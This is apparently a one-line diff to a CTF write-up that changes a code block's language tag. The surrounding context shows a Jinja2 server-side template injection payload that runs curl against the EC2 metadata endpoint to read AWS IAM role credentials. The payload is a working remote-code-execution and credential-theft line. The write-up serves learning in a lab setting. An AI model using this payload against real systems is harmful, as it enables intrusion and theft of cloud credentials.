@@ -1125,7 +1125,7 @@ After a while, I test SSTI Jinja2 and found it vulnerable to it. <br>
 ![metadata](/assets/img/squ1rrel-ctf_2025/ssti.png)
 
 I found this [hacktricks-ssti-jinja2-rce](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#jinja2-remote-code-execution) and try to exploit it. And from this [hacking-thecloud](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/) blog, I found that we can use `http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2instancerole` to get the `AWS credentials`. <br>
-```text
+```jinja2
 name={{config.__class__.__init__.__globals__['os'].popen('curl+-s+http%3a//169.254.169.254/latest/meta-data/iam/security-credentials/ec2instancerole').read()}}
 ```
 
